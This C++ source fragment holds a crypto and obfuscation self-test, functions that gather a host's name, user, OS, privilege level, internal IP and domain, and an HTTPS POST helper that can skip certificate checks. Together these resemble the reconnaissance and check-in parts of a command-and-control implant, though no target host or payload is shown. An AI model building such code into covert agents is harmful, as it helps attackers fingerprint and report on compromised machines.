        // Test 1: Basic encryption/decryption
        std::cout << "Test 1: Basic Encryption/Decryption" << std::endl;
        EnterpriseCrypto crypto;
        std::string test_data = "Hello, Enterprise Security World! 🔒";
        
        auto encrypted = crypto.encrypt(test_data);
        std::cout << "  Encrypted successfully (Key ID: " << encrypted.key_id << ")" << std::endl;
        
        std::string decrypted = crypto.decrypt(encrypted);
        std::cout << "  Decrypted: " << decrypted << std::endl;
        
        if (decrypted == test_data) {
            std::cout << "  ✅ PASSED\n" << std::endl;
        } else {
            std::cout << "  ❌ FAILED - Decrypted text doesn't match original\n" << std::endl;
            return 1;
        }
        
        // Test 2: Advanced obfuscation encoding/decoding
        std::cout << "Test 2: Advanced Obfuscation" << std::endl;
        std::string obfuscated = crypto.advancedObfuscateEncode(test_data);
        std::cout << "  Obfuscated: " << obfuscated.substr(0, 40) << "..." << std::endl;
        
        std::string deobfuscated = crypto.advancedObfuscateDecode(obfuscated);
        std::cout << "  Deobfuscated: " << deobfuscated << std::endl;
        
        if (deobfuscated == test_data) {
            std::cout << "  ✅ PASSED\n" << std::endl;
        } else {
            std::cout << "  ❌ FAILED - Advanced obfuscation roundtrip failed" << std::endl;
            std::cout << "  Expected: " << test_data << std::endl;
            std::cout << "  Got: " << deobfuscated << std::endl;
            return 1;
        }
        
        // Test 3: Various data types
        std::cout << "Test 3: Various Data Types" << std::endl;
        std::vector<std::string> test_cases = {
            "Simple text",
            "Text with numbers 12345",
            "Special chars: !@#$%^&*()",
            "Unicode: 你好世界 🌍",
            "Base64-like: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
            ""  // Empty string
        };
        
        for (size_t i = 0; i < test_cases.size(); ++i) {
            std::string original = test_cases[i];
            std::string obfuscated = crypto.advancedObfuscateEncode(original);
            std::string recovered = crypto.advancedObfuscateDecode(obfuscated);
            
            if (recovered == original) {
                std::cout << "  Test case " << (i + 1) << ": ✅ PASSED" << std::endl;
            } else {
                std::cout << "  Test case " << (i + 1) << ": ❌ FAILED" << std::endl;
                std::cout << "    Original: '" << original << "'" << std::endl;
                std::cout << "    Recovered: '" << recovered << "'" << std::endl;
                return 1;
            }
        }
        std::cout << "  ✅ ALL PASSED\n" << std::endl;
        
        std::cout << "🎉 All enterprise crypto tests passed!" << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "❌ Crypto test failed: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}
#endif

// Placeholder implementations for system info functions
std::string getHostname() {
    char hostname[256];
#ifdef _WIN32
    DWORD size = sizeof(hostname);
    if (GetComputerNameA(hostname, &size)) {
        return std::string(hostname);
    }
#else
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        return std::string(hostname);
    }
#endif
    return "unknown";
}

std::string getCurrentUsername() {
#ifdef _WIN32
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        return std::string(username);
    }
#else
    const char* username = getenv("USER");
    if (username) {
        return std::string(username);
    }
#endif
    return "unknown";
}

std::string getOperatingSystem() {
#ifdef _WIN32
    return "Windows";
#else
    struct utsname unameData;
    if (uname(&unameData) == 0) {
        return std::string(unameData.sysname) + " " + std::string(unameData.release);
    }
    return "Unix";
#endif
}

std::string getArchitecture() {
#ifdef _WIN32
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";
#else
    struct utsname unameData;
    if (uname(&unameData) == 0) {
        return std::string(unameData.machine);
    }
    return "unknown";
#endif
}

uint32_t getCurrentProcessId() {
#ifdef _WIN32
    return GetCurrentProcessId();
#else
    return getpid();
#endif
}

std::string getProcessName() {
#ifdef _WIN32
    char path[MAX_PATH];
    if (GetModuleFileNameA(nullptr, path, MAX_PATH)) {
        std::string fullPath(path);
        size_t lastSlash = fullPath.find_last_of('\\');
        return (lastSlash != std::string::npos) ? fullPath.substr(lastSlash + 1) : fullPath;
    }
#else
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len != -1) {
        path[len] = '\0';
        std::string fullPath(path);
        size_t lastSlash = fullPath.find_last_of('/');
        return (lastSlash != std::string::npos) ? fullPath.substr(lastSlash + 1) : fullPath;
    }
#endif
    return "unknown";
}

std::string getIntegrityLevel() {
#ifdef _WIN32
    // Simplified integrity level detection
    BOOL isElevated = FALSE;
    HANDLE token = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return isElevated ? "High" : "Medium";
#else
    return (getuid() == 0) ? "Root" : "User";
#endif
}

std::string getInternalIP() {
#ifdef _WIN32
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        struct hostent* hostEntry = gethostbyname(hostname);
        if (hostEntry && hostEntry->h_addr_list[0]) {
            struct in_addr addr;
            memcpy(&addr, hostEntry->h_addr_list[0], sizeof(struct in_addr));
            return inet_ntoa(addr);
        }
    }
#else
    struct ifaddrs* ifaddr;
    if (getifaddrs(&ifaddr) != -1) {
        for (struct ifaddrs* ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in* addr_in = (struct sockaddr_in*)ifa->ifa_addr;
                std::string ip = inet_ntoa(addr_in->sin_addr);
                if (ip != "127.0.0.1") {
                    freeifaddrs(ifaddr);
                    return ip;
                }
            }
        }
        freeifaddrs(ifaddr);
    }
#endif
    return "127.0.0.1";
}

std::string getCurrentWorkingDirectory() {
    char cwd[1024];
#ifdef _WIN32
    if (GetCurrentDirectoryA(sizeof(cwd), cwd)) {
        return std::string(cwd);
    }
#else
    if (getcwd(cwd, sizeof(cwd))) {
        return std::string(cwd);
    }
#endif
    return "unknown";
}

std::string getDomainName() {
#ifdef _WIN32
    char domain[256];
    DWORD size = sizeof(domain);
    if (GetUserNameExA(NameSamCompatible, domain, &size)) {
        std::string fullName(domain);
        size_t backslash = fullName.find('\\');
        return (backslash != std::string::npos) ? fullName.substr(0, backslash) : "WORKGROUP";
    }
    return "WORKGROUP";
#else
    char domain[256];
    if (getdomainname(domain, sizeof(domain)) == 0) {
        return std::string(domain);
    }
    return "localdomain";
#endif
}

std::string sendHttpRequestSecure(std::string_view host, std::string_view port,
                                std::string_view uri, std::string_view payload,
                                const std::map<std::string, std::string>& headers,
                                bool verify_ssl) {
    try {
        std::string url = "https://" + std::string(host) + ":" + std::string(port) + std::string(uri);
        
        cpr::Response response = cpr::Post(
            cpr::Url{url},
            cpr::Body{std::string(payload)},
            cpr::Header{headers.begin(), headers.end()},
            cpr::VerifySsl{verify_ssl},
            cpr::Timeout{30000}
        );
        
        if (response.status_code == 200) {
            return response.text;
        }
    } catch (const std::exception& e) {
        std::cerr << "[!] HTTP request failed: " << e.what() << std::endl;
    }
    
    return "";
}